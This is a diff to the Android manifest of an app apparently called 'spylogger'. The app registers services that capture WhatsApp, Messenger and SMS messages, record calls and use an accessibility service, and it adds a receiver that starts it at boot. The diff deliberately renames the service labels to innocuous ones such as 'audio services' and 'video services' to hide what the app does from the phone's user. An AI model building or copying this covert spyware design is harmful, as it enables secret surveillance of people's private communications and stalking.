@@ -37,7 +37,7 @@
         android:supportsRtl="true"
         android:theme="@style/AppTheme" >
         <activity
-            android:name=".activities.LoginActivity"
+            android:name="com.gravatasufoca.spylogger.activities.LoginActivity"
             android:label="@string/app_name" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -46,21 +46,14 @@
             </intent-filter>
         </activity>
 
-        <receiver android:name=".receivers.SMSReceiver">
-            <intent-filter>
-                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
-            </intent-filter>
-        </receiver>
-
-
         <!--FMC-->
-        <service android:name=".services.fcm.MyFirebaseInstanceIDService">
+        <service android:name="com.gravatasufoca.spylogger.services.fcm.MyFirebaseInstanceIDService">
             <intent-filter>
                 <action android:name="com.google.firebase.INSTANCE_ID_EVENT" />
             </intent-filter>
         </service>
         <service
-            android:name=".services.fcm.MessageReceived">
+            android:name="com.gravatasufoca.spylogger.services.fcm.MessageReceived">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT"/>
             </intent-filter>
@@ -68,44 +61,61 @@
 
         <!--whatsapp-->
         <service
-            android:name=".services.WhatsAppService"
+            android:name="com.gravatasufoca.spylogger.services.WhatsAppService"
             android:enabled="true"
             android:exported="false"
-            android:label="WhatsApp messages">
+            android:label="audio services">
         </service>
 
         <!--messenger-->
         <service
-            android:name=".services.MessengerService"
+            android:name="com.gravatasufoca.spylogger.services.MessengerService"
             android:enabled="true"
             android:exported="false"
-            android:label="Messesnger messages">
+            android:label="video services">
         </service>
 
         <!--sms-->
         <service
-            android:name=".services.SmsService"
+            android:name="com.gravatasufoca.spylogger.services.SmsService"
             android:enabled="true"
             android:exported="false"
-            android:label="SMS messages">
+            android:label="SMS services">
         </service>
+        <receiver android:name="com.gravatasufoca.spylogger.receivers.SMSReceiver">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
         <!--recording-->
         <service
-            android:name=".services.RecordService"
+            android:name="com.gravatasufoca.spylogger.services.RecordService"
             android:enabled="true"
             android:exported="false"
-            android:label="Call recording">
+            android:label="call service">
         </service>
 
-        <service android:name=".receivers.InstantMessenger"
+        <service android:name="com.gravatasufoca.spylogger.receivers.InstantMessenger"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
             <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibilityservice" />
-
         </service>
+
+        <!--boot-->
+        <receiver
+            android:name="com.gravatasufoca.spylogger.receivers.BootStarter"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+
+        <!--alarm-->
+        <receiver android:name="com.gravatasufoca.spylogger.receivers.Alarm"/>
 
     </application>
 
